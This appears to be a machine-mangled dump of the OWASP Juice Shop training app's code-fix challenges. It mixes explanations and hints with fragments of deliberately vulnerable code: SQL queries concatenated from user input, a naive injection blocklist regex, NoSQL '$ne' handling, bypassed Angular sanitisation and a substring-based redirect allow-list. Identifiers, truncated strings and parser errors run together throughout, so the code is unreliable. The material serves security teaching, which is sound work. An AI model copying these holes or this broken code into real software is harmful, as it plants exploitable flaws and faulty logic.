Dispel'Security Advisory'Security Advisory' The Juice Shop is susceptible to a known vulnerability in a library, for which an advisory has already been issued, marking the Juice Shop as <i>known affected</i>. A fix is still pending. <a href="/#/contact">Inform the shop</a> about a suitable checksum as proof that you did your due diligence.' The J ... gence.'Security Advisories are often listed in the security.txt'Securi ... ty.txt'name: ' ... visory'P:/My Drive/Git/juice-shop/data/static/codefixes/accessLogDisclosureChallenge.info.ymlP:/My Drive/Git/juice-shop/data/static/codefixesfixesexplanationThere should generally be no good reason to expose server logs through a web URL of the server itself, epecially not when that server is Internet-facing.'There  ... acing.'id: 1Switching off the detailed view option is a cosmetic change on the directory listing but still allows the logs to be browsed and accessed."Switch ... essed."id: 2Removing the route that serves individual log files is likely to plumb the data leak but still provides information to the attacker unnecessarily.'Removi ... arily.'id: 3Removing only the directory listing will still allow attackers to download individual log files if they can come up with a valid file name.'Removi ...  name.'id: 4- id: 1hintsCan you identify one or more routes which have something to do with log files?"Can yo ... files?"Did you spot the directory listing clearly linked to log files?"Did yo ... files?"Did you notice that there is a seperate route for retrieving individual log files?Make sure to select both lines responsible for the log file data leakage."Make s ... akage."- "Can  ... files?"fixes:P:/My Drive/Git/juice-shop/data/static/codefixes/accessLogDisclosureChallenge_1_correct.ts /ftp directory browsing and file download /* /ftp ... load */ /encryptionkeys directory browsing /* /enc ... sing */ Swagger documentation for B2B v2 endpoints /* Swag ... ints */'/ftp'serveIndexMiddlewareserveIndex'ftp'icons'/ftp(?!/quarantine)/:file'fileServer'/ftp/quarantine/:file'quarantineServer'/.well-known''.well-known''details'expressstatic'/encryptionkeys''encryptionkeys''/encryptionkeys/:file'keyServer'/api-docs'swaggerUiserveswaggerDocument'frontend/dist/frontend'cookieParser'kekse'app.use ... rue }))app.use/ftpserveIn ... true })ftp{ icons: true }icons: trueapp.use ... rver())'/ftp(? ... /:file'/ftp(?!/quarantine)/:file(?!/quarantine)/quarantine/:filefileServer()'/ftp/q ... /:file'/ftp/quarantine/:filequarantineServer()app.use ... ls' }))/.well-knownwell-knownserveIn ... ils' }).well-known{ icons ... ails' }view: 'details'app.use ... nown'))express ... known')express.static/encryptionkeysencryptionkeys'/encry ... /:file'/encryptionkeys/:filekeyServer()app.use ... ument))/api-docsswaggerUi.serveswagger ... cument)swaggerUi.setupapp.use ... end')))express ... tend'))path.re ... ntend')'fronte ... ontend'frontend/dist/frontendapp.use ... ekse'))cookieP ... kekse')kekseP:/My Drive/Git/juice-shop/data/static/codefixes/accessLogDisclosureChallenge_2.ts /logs directory browsing /* /log ... sing */'/support/logs''logs''/support/logs/:file'logFileServer/support/logslogs'/suppo ... /:file'/support/logs/:filelogFileServer()P:/My Drive/Git/juice-shop/data/static/codefixes/accessLogDisclosureChallenge_3.tsP:/My Drive/Git/juice-shop/data/static/codefixes/accessLogDisclosureChallenge_4.tsP:/My Drive/Git/juice-shop/data/static/codefixes/adminSectionChallenge.info.ymlWhile attempts could be made to limit access to administrative functions of a web shop through access control, it is definitely safer to apply the "separation of concerns" pattern more strictly by internally hosting a distinct admin backend application with no Internet exposure.'While  ... osure.'Obfuscating the path to the administration section does not add any security, even if it wasn't just a trivial Base64 encoding."Obfusc ... oding."This obfuscation attempt is hard to undo by hand but trivial when executed in a JavaScript console. Regardless, obfuscating the route does not add any level of security.'This o ... urity.'Assuming that the original "AdminGuard" provided access control only to admin users, switching to "LoginGuard" seems like a downgrade that would give access to any authenticated user.'Assumi ...  user.'Among the long list of route mappings, can you spot any that seem responsible for admin-related functionality?"Among  ... ality?"Luckily the route mappings were originally in alphabetical order before the developers forgot about that rule at some point."Luckil ... point."- "Amon ... ality?"P:/My Drive/Git/juice-shop/data/static/codefixes/adminSectionChallenge_1_correct.ts TODO: Externalize admin functions into separate application
           that is only accessible inside corporate network.
   /* TODO ... \r\n   */ {// {   path: 'administration',//   pa ... ation',   component: AdministrationComponent,//   co ... ponent,   canActivate: [AdminGuard]//   ca ... nGuard] },// },Routes'accounting'componentAccountingComponentcanActivateAccountingGuard'about'AboutComponent'address/select'AddressSelectComponentLoginGuard'address/saved'SavedAddressComponent'address/create'AddressCreateComponent'address/edit/:addressId''delivery-method'DeliveryMethodComponent'deluxe-membership'DeluxeUserComponent'saved-payment-methods'SavedPaymentMethodsComponent'basket'BasketComponent'order-completion/:id'OrderCompletionComponent'contact'ContactComponent'photo-wall'PhotoWallComponent'complain'ComplaintComponent'chatbot'ChatbotComponent'order-summary'OrderSummaryComponent'order-history'OrderHistoryComponent'payment/:entity'PaymentComponent'wallet'WalletComponent'login'LoginComponent'forgot-password'ForgotPasswordComponent'recycle'RecycleComponent'register'RegisterComponent'search'SearchResultComponent'hacking-instructor''score-board'ScoreBoardComponent'track-result'TrackResultComponent'track-result/new''new''2fa/enter'TwoFactorAuthEnterComponent'privacy-security'PrivacySecurityComponent'privacy-policy'PrivacyPolicyComponent'change-password'ChangePasswordComponent'two-factor-authentication'TwoFactorAuthComponent'data-export'DataExportComponent'last-login-ip'LastLoginIpComponent'juicy-nft'NFTUnlockComponent'wallet-web3'loadChildrenloadWeb3WalletModule'web3-sandbox'loadWeb3SandboxtModule'bee-haven'loadFaucetModulematcheroauthMatcher'#'OAuthComponenttokenMatcherTokenSaleComponent'403'ErrorPageComponent'**'const r ... \n  }\r\n]routes: ... \n  }\r\n][\r\n  /* ... \n  }\r\n]{\r\n     ... d]\r\n  }path: 'accounting'accountingcompone ... mponentcanActi ... gGuard][AccountingGuard]{\r\n     ... nt\r\n  }path: 'about'path: ' ... select'address/selectAddress ... mponentcanActi ... nGuard][LoginGuard]path: ' ... /saved'address/savedSavedAd ... mponentpath: ' ... create'address/createpath: ' ... ressId''addres ... ressId'address/edit/:addressIdpath: ' ... method'delivery-methodDeliver ... mponentpath: ' ... ership'deluxe-membershippath: ' ... ethods''saved- ... ethods'saved-payment-methodsSavedPa ... mponentpath: 'basket'path: ' ... on/:id''order- ... on/:id'order-completion/:idOrderCo ... mponentpath: 'contact'path: 'photo-wall'photo-wallpath: 'complain'complainpath: 'chatbot'chatbotpath: ' ... ummary'order-summaryOrderSu ... mponentpath: ' ... istory'order-historyOrderHi ... mponentpath: ' ... entity'payment/:entitypath: 'wallet'walletpath: 'login'loginpath: ' ... ssword'forgot-passwordForgotP ... mponentpath: 'recycle'path: 'register'path: 'search'SearchR ... mponentpath: ' ... ructor'hacking-instructorpath: 'score-board'score-boardpath: 'track-result'track-resultpath: ' ... lt/new'track-result/newdata: { ... \r\n    }type: 'new'path: '2fa/enter'2fa/enterTwoFact ... mponent{\r\n     ...  ]\r\n  }path: ' ... curity'privacy-securityPrivacy ... mponentchildre ... \r\n    ][\r\n     ... \r\n    ]path: ' ... policy'privacy-policychange-passwordChangeP ... mponentpath: ' ... cation''two-fa ... cation'two-factor-authenticationpath: 'data-export'data-exportpath: ' ... gin-ip'last-login-ippath: 'juicy-nft'juicy-nftpath: 'wallet-web3'wallet-web3loadChi ... odule()async ( ... odule()await l ... odule()loadWeb ... odule()path: 'web3-sandbox'web3-sandboxloadWeb ... tModulepath: 'bee-haven'bee-havenloadFaucetModule()matcher ... Matcherdata: { ... '#')) }{ param ... '#')) }params: ... f('#'))(window ... f('#'))(window ... .substr(window ... n.href)window.location.hrefwindow.locationwindow. ... Of('#')window. ... indexOf#path: '403'403path: '**'**P:/My Drive/Git/juice-shop/data/static/codefixes/adminSectionChallenge_2.ts'YWRtaW5pc3RyYXRpb24='AdministrationComponentAdminGuard[\r\n  {\r ... \n  }\r\n]path: a ... pb24=')atob('Y ... pb24=')'YWRtaW ... Rpb24='YWRtaW5pc3RyYXRpb24=Adminis ... mponent[AdminGuard]P:/My Drive/Git/juice-shop/data/static/codefixes/adminSectionChallenge_3.tsG551671711651681581546274927896036Vl4358211path: ( ... 58,211)(functi ... 58,211)(functi ... rCase()(functi ... 58,154)(functi ... n('')})functio ... in('')}{var t= ... in('')}var t=A ... hift();t=Array ... uments)Array.p ... uments)Array.p ... ce.callG=t.shift()t.shift()t.shiftreturn  ... oin('')t.rever ... oin('')t.rever ... }).joint.rever ... -2-w)})t.reverse().mapt.reverse()t.reversefunctio ... G-2-w)}{return ... G-2-w)}return  ... -G-2-w)String. ... -G-2-w)e-G-2-we-G-2e-G(627492 ... rCase()(627492 ... werCase(627492 ... ing(36)(627492 ... oString(62749278960){var b= ... in('')}var b=A ... hift();b=Array ... uments)V=b.shift()b.shift()b.shiftb.rever ... oin('')b.rever ... }).joinb.rever ... 43-S)})b.reverse().mapb.reverse()b.reversefunctio ... -43-S)}{return ... -43-S)}return  ... V-43-S)String. ... V-43-S)l-V-43-Sl-V-43l-VP:/My Drive/Git/juice-shop/data/static/codefixes/adminSectionChallenge_4.ts'administration'path: ' ... ration'administrationP:/My Drive/Git/juice-shop/data/static/codefixes/changeProductChallenge.info.ymlWhile removing the commented-out line made the code cleaner, it did not change the functionality in any way and thus cannot have improved security either."While  ... ither."Removing all dedicated handling of the products API made things worse, as now the default permissions of the underlying API generator will be used: Allowing GET, POST, PUT and DELETE - without any restrictions.'Removi ... tions.'Disabling all HTTP verbs other than GET for the products API is indeed the only safe way to implement secure access control. Shop administrators should not use the customer facing web UI to manage the store's inventory anyway."Disabl ... nyway."You improved security slightly by no longer accepting PUT requests from anonymous API callers. But does the shop even want to allow its authenticated customers to change products themselves?'You im ... elves?'In the long list of API-handling middleware, try to find the ones dealing with products offered in the shop first."In the ... first."API routes need to specifically define a handler for a HTTP verb if they wish to override the "allow everything to everyone" default behavior.'API ro ... avior.'There is one line that is commented out for no good reason among the product-related middleware."There  ... eware."- "In t ... first."P:/My Drive/Git/juice-shop/data/static/codefixes/changeProductChallenge_1.ts Authorization */** Aut ... ion **/ Baskets: Unauthorized users are not allowed to access baskets /* Bask ... kets */ BasketItems: API only accessible for authenticated users /* Bask ... sers */ Feedbacks: GET allowed for feedback carousel, POST allowed in order to provide feedback without being logged in /* Feed ... d in */ Users: Only POST is allowed in order to register a new user /* User ... user */ Products: Only GET is allowed in order to view products /* Prod ... ucts */ Challenges: GET list of challenges allowed. Everything else forbidden entirely /* Chal ... rely */ Complaints: POST and GET allowed when logged in only /* Comp ... only */ Recycles: POST and GET allowed when logged in only /* Recy ... only */ Challenge evaluation before finale takes over /* Chal ... over */ SecurityQuestions: Only GET list of questions allowed. /* Secu ... wed. */ SecurityAnswers: Only POST of answer allowed.  REST API /* REST API */ Unauthorized users are not allowed to access B2B API /* Unau ...  API */ Check if the quantity is available in stock and limit per user not exceeded, then add item to basket /* Chec ... sket */ Accounting users are allowed to check and update quantities /* Acco ... ties */ Feedbacks: Do not allow changes of existing feedback /* Feed ... back */ PrivacyRequests: Only allowed for authenticated users /* Priv ... sers */ PaymentMethodRequests: Only allowed for authenticated users /* Paym ... sers */ PrivacyRequests: Only POST allowed for authenticated users '/rest/basket'isAuthorizedappendUserId'/api/BasketItems''/api/BasketItems/:id''/api/Feedbacks/:id''/api/Users'route'/api/Users/:id'denyAll'/api/Products''/api/Products/:id''/api/Challenges''/api/Challenges/:id''/api/Complaints''/api/Complaints/:id''/api/Recycles'blockRecycleItems'/api/Recycles/:id'getRecycleItem'/api/SecurityQuestions''/api/SecurityQuestions/:id''/api/SecurityAnswers''/api/SecurityAnswers/:id''/rest/user/authentication-details''/rest/basket/:id''/rest/basket/:id/order''/b2b/v2'quantityCheckBeforeBasketItemUpdatequantityCheckBeforeBasketItemAdditionaddBasketItem'/api/Quantitys/:id''/api/Quantitys'isAccountingipfilter'123.456.789''allow''/api/PrivacyRequests''/api/PrivacyRequests/:id''/api/Cards'paymentgetPaymentMethods'/api/Cards/:id'delPaymentMethodByIdgetPaymentMethodById'/api/Addresss'getAddress'/api/Addresss/:id'delAddressByIdgetAddressById'/api/Deliverys'deliverygetDeliveryMethods'/api/Deliverys/:id'getDeliveryMethodAuthorization *app.use ... erId())/rest/basketsecurit ... rized()securit ... horizedsecurit ... serId()securit ... dUserIdapp.use ... ized())/api/BasketItems'/api/B ... ms/:id'/api/BasketItems/:id/api/Feedbacks/:idapp.get ... ized())app.get/api/Usersapp.rou ... yAll())app.rou ... .deleteapp.rou ...    .putapp.rou ... ized())app.rou ...    .getapp.rou ... s/:id')app.route/api/Users/:idsecurity.denyAll()security.denyAllapp.pos ... ized())app.post/api/Productsapp.del ... yAll())app.delete/api/Products/:idapp.pos ... yAll())/api/Challengesapp.use ... yAll())'/api/C ... es/:id'/api/Challenges/:id/api/Complaints'/api/C ... ts/:id'/api/Complaints/:idapp.get ... tems())/api/Recyclesrecycle ... Items()recycle ... leItemsapp.get ... Item())/api/Recycles/:idrecycle ... eItem()recycle ... cleItemapp.put ... yAll())app.put'/api/S ... stions'/api/SecurityQuestions'/api/S ... ns/:id'/api/SecurityQuestions/:idapp.get ... yAll())'/api/S ... nswers'/api/SecurityAnswers'/api/S ... rs/:id'/api/SecurityAnswers/:id'/rest/ ... etails'/rest/user/authentication-details/rest/basket/:id'/rest/ ... /order'/rest/basket/:id/order/b2b/v2app.put ... date())basketI ... pdate()basketI ... mUpdatequantit ... mUpdateapp.pos ... Item())basketI ... ition()basketI ... dditionquantit ... dditionbasketI ... tItem()basketI ... ketItem/api/Quantitys/:id/api/Quantitysapp.use ... ow' }))securit ... nting()securit ... ountingipfilte ... low' })['123.456.789']123.456.789123456789{ mode: 'allow' }mode: 'allow'allow'/api/P ... quests'/api/PrivacyRequests'/api/P ... ts/:id'/api/PrivacyRequests/:idapp.pos ... erId())/api/Cardsapp.get ... hods())payment ... thods()payment ... Methods/api/Cards/:idapp.del ... ById())payment ... dById()payment ... hodByIdapp.get ... ById())/api/Addresssapp.get ... ress())address.getAddress()address.getAddressapp.put ... erId())/api/Addresss/:idaddress ... sById()address ... essById/api/Deliverysdeliver ... thods()deliver ... Methodsapp.get ... thod())/api/Deliverys/:iddeliver ... ethod()deliver ... yMethodP:/My Drive/Git/juice-shop/data/static/codefixes/changeProductChallenge_2.tsP:/My Drive/Git/juice-shop/data/static/codefixes/changeProductChallenge_3_correct.tsP:/My Drive/Git/juice-shop/data/static/codefixes/changeProductChallenge_4.tsapp.put ... ized())P:/My Drive/Git/juice-shop/data/static/codefixes/dbSchemaChallenge.info.ymlReplacing the template string (`...`) notation with plain string concatenation ("..."+"...") does not change the behavior of the code in any way. It only makes the code less readable.'Replac ... dable.'Using the built-in replacement (or binding) mechanism of Sequelize is equivalent to creating a Prepared Statement. This prevents tampering with the query syntax through malicious user input as it is "set in stone" before the criteria parameter is inserted.'Using  ... erted.'Trying to prevent any injection attacks with a custom-built blocklist mechanism is doomed to fail. It might work for some simpler attack payloads but an attacker with time and skills can likely bypass it at some point."Trying ... point."Try to identify any variables in the code that might contain arbitrary user input."Try to ... input."Follow the user input through the function call and try to spot places where it might be abused for malicious purposes."Follow ... poses."Can you spot a place where a SQL query is being cobbled together in an unsafe way?"Can yo ... e way?"- "Try  ... input."P:/My Drive/Git/juice-shop/data/static/codefixes/dbSchemaChallenge_1.tssearchProductsreqresNextFunctioncriteria'undefined'<=sequelize"SELECT * FROM Products WHERE ((name LIKE '%""%' OR description LIKE '%""%') AND deletedAt IS NULL) ORDER BY name"dataString__queryResultToJsonErrorWithParentmodule. ... \n  }\r\n}functio ... \n  }\r\n}{\r\n  re ... \n  }\r\n}return  ... })\r\n  }(req: R ... })\r\n  }let cri ... q ?? ''criteri ... q ?? ''req.que ... q ?? ''req.que ... efined'req.query.qreq.queryreq.query.q ?? ''criteri ... 0, 200)(criter ... 0, 200)(criter ... <= 200)criteri ...  <= 200criteria.lengthcriteria.substringmodels. ...      })models. ... ).catchmodels. ...   .thenmodels. ...  name")models. ... e.querymodels.sequelize"SELECT ... Y name""SELECT ... riteria"SELECT ... IKE '%"SELECT * FROM Products WHERE ((name LIKE '%"%' OR  ... IKE '%"%' OR description LIKE '%"%') AN ... Y name"%') AND deletedAt IS NULL) ORDER BY name([produ ...       }[products]const d ... oducts)dataStr ... oducts)JSON.st ... oducts)product ... ].name)products[i].namereq.__( ... ].name)req.__product ... iption)product ... riptionreq.__( ... iption)res.jso ... ducts))res.jsonutils.q ... oducts)utils.q ... tToJson(error: ...       }next(error.parent)error.parentP:/My Drive/Git/juice-shop/data/static/codefixes/dbSchemaChallenge_2_correct.ts`SELECT * FROM Products WHERE ((name LIKE '%:criteria%' OR description LIKE '%:criteria%') AND deletedAt IS NULL) ORDER BY name`replacementsmodels. ...  ).thenmodels. ...       )`SELECT ... Y name`SELECT * FROM Products WHERE ((name LIKE '%:criteria%' OR description LIKE '%:criteria%') AND deletedAt IS NULL) ORDER BY name{ repla ... ria } }replace ... teria }{ criteria }P:/My Drive/Git/juice-shop/data/static/codefixes/dbSchemaChallenge_3.tsinjectionChars/"|'|;|and|or|;|#/i400`SELECT * FROM Products WHERE ((name LIKE '%${}%' OR description LIKE '%${}%') AND deletedAt IS NULL) ORDER BY name`const i ... |;|#/i;injecti ... r|;|#/i"|'|;|and|or|;|#"'orif (cri ... \r\n    }criteri ... nChars)criteria.matchres.sta ... .send()res.status(400).sendres.status(400)res.statusmodels. ...  name`)SELECT  ... LIKE '%%' OR d ... LIKE '%%') AND ... BY nameP:/My Drive/Git/juice-shop/data/static/codefixes/directoryListingChallenge.info.ymlGetting rid of the /ftp folder entirely is the only way to plumb this data leakage for good. Valid static content in it needs to be moved to a more suitable location and order confirmation PDFs had no business to be placed there publicly accessible in the first place. Everything else in that folder was just accidentally put & forgotten there anyway.'Gettin ... nyway.'Removing only the directory listing will still allow attackers to download individual files if they can come up with a valid file name.Removing the routes that serve individual files is likely to plumb the data leak but still provides information to the attacker unnecessarily.Switching off the icons is a cosmetic change on the directory listing but still allows the files to be browsed and accessed.Can you identify one or more routes which have something to do with file serving?"Can yo ... rving?"Did you notice that there are seperate routes the directory listing and retrieving individual files?Make sure to select both lines responsible for the data leakage.- "Can  ... rving?"P:/My Drive/Git/juice-shop/data/static/codefixes/directoryListingChallenge_1_correct.tsP:/My Drive/Git/juice-shop/data/static/codefixes/directoryListingChallenge_2.ts /ftp file download P:/My Drive/Git/juice-shop/data/static/codefixes/directoryListingChallenge_3.ts /ftp directory browsing /* /ftp ... sing */P:/My Drive/Git/juice-shop/data/static/codefixes/directoryListingChallenge_4.tsapp.use ... lse }))serveIn ... alse }){ icons: false }icons: falseP:/My Drive/Git/juice-shop/data/static/codefixes/exposedMetricsChallenge.info.ymlThis fix prevents unauthorized access to the metrics route but overshoots the goal by locking out everyone - including administrators."This f ... ators."The metrics route remains publicly accessible. This change only messes with functional settings of the measurement framework unnecessarily."The me ... arily."Access will now be restricted only to users with administrator permissions, which seems reasonable protection, assuming that it is not possible for a regular user to escalate admin priviliges. If that were a risk, the metrics should better be stored behind the scenes not be made accessible via the shop application at all."Access ... t all."Can you find a HTTP route mapping that deals with metrics?"Can yo ... trics?"Remember: The default behavior of route mappings is to allow access to everyone."Rememb ... ryone."- "Can  ... trics?"P:/My Drive/Git/juice-shop/data/static/codefixes/exposedMetricsChallenge_1.ts Serve metrics /* Serve metrics */metricsUpdateLoopMetricsmetricsobserveMetrics'/metrics'serveMetricserrorhandler} (Express ${'express'readyCallbackdatacreatorEndstartupGaugestartTimer'datacreator'datacreatorPORT'server.port'BASE_PATH'server.basePath'updateLoopcyan`Server listening on port ${'ready'`Server using proxy base path ${} for redirects`registerWebsocketEventslet met ... op: anymetrics ... op: anyconst M ... trics()Metrics ... trics()metrics ... trics()metrics ... Metricsapp.get ... rics())/metricsmetrics.serveMetricserrorha ... ss')})`errorhandler.title`${conf ... ss')})` (Express utils.v ... press')utils.versionexport  ... })\r\n\r\n}async f ... })\r\n\r\n}{\r\n  co ... })\r\n\r\n}const d ... tor' })datacre ... tor' })startup ... tor' })startup ... rtTimer{ task: ... ator' }task: 'datacreator'await s ... true })sequeli ... true })sequelize.sync{ force: true }force: trueawait datacreator()datacreator()datacreatorEnd()const p ... .port')port =  ... .port')process ... .port')process.env.PORTconfig. ... .port')server.portprocess ... ePath')process ... SE_PATHconfig. ... ePath')server.basePathmetrics ... eLoop()Metrics.updateLoop()Metrics.updateLoopserver. ... }\r\n  })server.listen() => { ...  }\r\n  }logger. ... }`)}`))logger.infocolors. ... t}`)}`)colors.cyan`Server ... rt}`)}`Server  ... n port Server listening on port colors. ... port}`)colors.bold`${port}`startup ... / 1000)startupGauge.set{ task: 'ready' }task: 'ready'(Date.n ...  / 1000(Date.n ... rtTime)Date.no ... artTimeDate.now()if (pro ... \r\n    }process ...  !== ''logger. ... ects`))colors. ... rects`)`Server ... irects`Server  ... e path Server using proxy base path colors. ... PATH}`)`${proc ... _PATH}` for redirectsregiste ... server)registe ... tEventsif (rea ... \r\n    }readyCallback()number | undefined{\r\n  if ... \n  }\r\n}if (ser ... ()\r\n  }clearIn ... teLoop)server.close()server.closeif (exi ... e)\r\n  }exitCod ... definedprocess ... itCode)process.exitP:/My Drive/Git/juice-shop/data/static/codefixes/exposedMetricsChallenge_2.tsP:/My Drive/Git/juice-shop/data/static/codefixes/exposedMetricsChallenge_3_correct.tsisAdminsecurity.isAdmin()security.isAdminP:/My Drive/Git/juice-shop/data/static/codefixes/forgedReviewChallenge.info.ymlThis solution would reassign an updated review to the last editor, but it would not prevent to change other user's reviews in the first place."This s ... place."Setting the author on server-side based on the user retrieved from the authentication token in the HTTP request is the right call. It prevents users from just passing any author email they like along with the request.'Settin ... quest.'Removing the option to update multiple documents at once is a good idea and might actually help against another flaw in this code. But it does not fix the problem of allowing users to update other user's reviews."Removi ... views."To find the culprit lines, you need to understand how MongoDB handles updating records."To fin ... cords."Did you notice that the developers retrieved a reference to the user but never actually use it for anything? This might be part of the problem."Did yo ... oblem."Another problematic line you need to select, is actually missing something that ties the user to the review."Anothe ... eview."- "To f ... cords."P:/My Drive/Git/juice-shop/data/static/codefixes/forgedReviewChallenge_1.tsproductReviewsauthenticatedUsers_id$setmultimodifiedoriginalconst u ... om(req)user =  ... om(req)securit ... om(req)securit ... rs.fromsecurit ... edUsersdb.revi ...      })db.revi ...  ).thendb.revi ... \r\n    )db.revi ... .updatedb.reviewsCollection{ _id: req.body.id }_id: req.body.idreq.body.idreq.body{ $set: ... ail } }$set: { ... email }{ messa ... email }message ... messagereq.body.messageauthor: ... a.emailuser.data.emailuser.data{ multi: true }multi: true(result ...       }{ modif ... ny }> }modified: number,origina ...  any }>Array<{ ...  any }>{ author: any }author: anyres.json(result)res.sta ... on(err)res.status(500).jsonres.status(500)P:/My Drive/Git/juice-shop/data/static/codefixes/forgedReviewChallenge_2_correct.ts{ _id:  ... email }{ $set: ... age } }$set: { ... ssage }{ messa ... ssage }P:/My Drive/Git/juice-shop/data/static/codefixes/forgedReviewChallenge_3.tsP:/My Drive/Git/juice-shop/data/static/codefixes/localXssChallenge.info.ymlUsing bypassSecurityTrustResourceUrl() instead of bypassSecurityTrustHtml() changes the context for which input sanitization is bypassed. This switch might only accidentally keep XSS prevention intact, but the new URL context does not make any sense here.'Using  ...  here.'Removing the bypass of sanitization entirely is the best way to fix this vulnerability. Fiddling with Angular's built-in sanitization was entirely unnecessary as the user input for a text search should not be expected to contain HTML that needs to be rendered but merely plain text."Removi ...  text."Using bypassSecurityTrustScript() instead of bypassSecurityTrustHtml() changes the context for which input sanitization is bypassed. If at all, this switch might only accidentally keep XSS prevention intact. The context where the parameter is used is not a script either, so this switch would be nonsensical.'Using  ... sical.'Using bypassSecurityTrustStyle() instead of bypassSecurityTrustHtml() changes the context for which input sanitization is bypassed. If at all, this switch might only accidentally keep XSS prevention intact. The context where the parameter is used is not CSS, making this switch totally pointless.'Using  ... tless.'Try to identify where (potentially malicious) user input is coming into the code."Try to ...  code."What is the code doing with the user input other than using it to filter the data source?"What i ... ource?"Look for a line where the developers fiddled with Angular's built-in security model."Look f ... model."- "Try  ...  code."P:/My Drive/Git/juice-shop/data/static/codefixes/localXssChallenge_1.tsError: ';' expected.filterTable () {
P:/My Drive/Git/juice-shop/data/static/codefixes/localXssChallenge_2_correct.tsP:/My Drive/Git/juice-shop/data/static/codefixes/localXssChallenge_3.tsP:/My Drive/Git/juice-shop/data/static/codefixes/localXssChallenge_4.tsP:/My Drive/Git/juice-shop/data/static/codefixes/loginAdminChallenge.info.ymlThis fix unfortunately goes only half the way to using the binding mechanism of Sequelize. Such a Prepared Statement still concatenated from user input, is still wide open for SQL Injection attacks.'This f ... tacks.'This fix uses the binding mechanism of Sequelize to create the equivalent of a Prepared Statement, which is great. Unfortunately this fix also introduces a critical functional bug into the authentication process.'This f ... ocess.'Using the built-in binding (or replacement) mechanism of Sequelize is equivalent to creating a Prepared Statement. This prevents tampering with the query syntax through malicious user input as it is "set in stone" before the criteria parameter is inserted.P:/My Drive/Git/juice-shop/data/static/codefixes/loginAdminChallenge_1.tsError: '}' expected.  }P:/My Drive/Git/juice-shop/data/static/codefixes/loginAdminChallenge_2.tsP:/My Drive/Git/juice-shop/data/static/codefixes/loginAdminChallenge_3.tsP:/My Drive/Git/juice-shop/data/static/codefixes/loginAdminChallenge_4_correct.tsP:/My Drive/Git/juice-shop/data/static/codefixes/loginBenderChallenge.info.ymlThis fix unfortunately goes only half the way to using the replacement mechanism of Sequelize. Such a Prepared Statement still concatenated from user input, is still wide open for SQL Injection attacks.Turning off the "plain" flag will let Sequelize return all matching rows instead of just the first one. This neither makes sense from a functional point of view in a login function, not could it prevent SQL Injection attacks.'Turnin ... tacks.'P:/My Drive/Git/juice-shop/data/static/codefixes/loginBenderChallenge_1.tsP:/My Drive/Git/juice-shop/data/static/codefixes/loginBenderChallenge_2_correct.tsP:/My Drive/Git/juice-shop/data/static/codefixes/loginBenderChallenge_3.tsP:/My Drive/Git/juice-shop/data/static/codefixes/loginBenderChallenge_4.tsP:/My Drive/Git/juice-shop/data/static/codefixes/loginJimChallenge.info.ymlP:/My Drive/Git/juice-shop/data/static/codefixes/loginJimChallenge_1_correct.tsP:/My Drive/Git/juice-shop/data/static/codefixes/loginJimChallenge_2.tsP:/My Drive/Git/juice-shop/data/static/codefixes/loginJimChallenge_3.tsP:/My Drive/Git/juice-shop/data/static/codefixes/loginJimChallenge_4.tsP:/My Drive/Git/juice-shop/data/static/codefixes/nftMintChallenge.info.ymlWrong!'Wrong!'Correct!'Correct!'Hint1'Hint1'Hint2'Hint2'Hint3'Hint3'- 'Hint1'P:/My Drive/Git/juice-shop/data/static/codefixes/nftUnlockChallenge.info.ymlP:/My Drive/Git/juice-shop/data/static/codefixes/noSqlReviewsChallenge.info.ymlRemoving the option to update multiple documents at once combined with avoiding a "not-equal"-based injection is insufficient against any attacker with at least moderate MongoDB query knowledge.'Removi ... ledge.'Removing the option to update multiple documents at once is definitely necessary. But it is unfortunately not a sufficient fix, as an attacker might still be able to "add back" the multi-update behavior.'Removi ... avior.'Removing the option to update multiple documents at once combined with only allowing plain strings in the ID parameter is the right call. This will prevent any attacker from injecting their own JSON payload to manipulate the query in their favor.'Removi ... favor.'Does this query really need to allow updating more than one review at once?"Does t ...  once?"Consider the query parameters under control of the attacker and try to find the one where they might inject some query-altering command."Consid ... mmand."P:/My Drive/Git/juice-shop/data/static/codefixes/noSqlReviewsChallenge_1.ts'$ne'if (req ... \r\n    }req.bod ... definedreq.body.id['$ne']$neneP:/My Drive/Git/juice-shop/data/static/codefixes/noSqlReviewsChallenge_2.tsP:/My Drive/Git/juice-shop/data/static/codefixes/noSqlReviewsChallenge_3_correct.tstypeof'string'if (typ ... \r\n    }typeof  ... string'typeof req.body.idP:/My Drive/Git/juice-shop/data/static/codefixes/redirectChallenge.info.ymlThe open redirect flaw in this code cannot be fixed by applying URL encoding to the target URL. In fact, it would break the entire redirect mechanism for allow-listed URLs as they are not URL-encoded and would therefore never match."The op ... match."Changing from logical "or" to logical "and" here does not do anything for security but entirely breaks the redirect mechanism as "allowed" can never be true after the loop.'Changi ...  loop.'HTML-escaping is completely wrong in this situation because the code is dealing with URLs and not HTML input."HTML-e ... input."Using indexOf allowed any URLs as long as they contained any allow-listed URL, even if it just would be as a parameter. Replacing this with an actual equality check mitigates this lapse and makes the redirect only work for allow-listed URLs."Using  ...  URLs."You should take a close look at how this code checks for allowed vs. forbidded URLs to redirect to."You sh ... ct to."Try to play through how the logical operators and used standard functions work in this situation."Try to ... ation."Could you somehow make the code believe that it is dealing with an allow-listed URL while it actually isn't?"Could  ... isn't?"- "You  ... ct to."P:/My Drive/Git/juice-shop/data/static/codefixes/redirectChallenge_1.tsredirectAllowlist'https://github.com/juice-shop/juice-shop''https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm''https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW''https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6''http://shop.spreadshirt.com/juiceshop''http://shop.spreadshirt.de/juiceshop''https://www.stickeryou.com/products/owasp-juice-shop/794''http://leanpub.com/juice-shop'isRedirectAllowedallowedallowedUrlexport  ... op'\r\n])const r ... op'\r\n])redirec ... op'\r\n])new Set ... op'\r\n])[\r\n  'h ... hop'\r\n]https://github.com/juice-shop/juice-shophttps://githubcom/juice-shop/juice-shop'https: ... G8DRZm'https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZmhttps://blockchaininfo/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm'https: ... ZN17kW'https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kWhttps://explorerdashorg/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW'https: ... 11eae6'https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6https://etherscanio/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6'http:/ ... 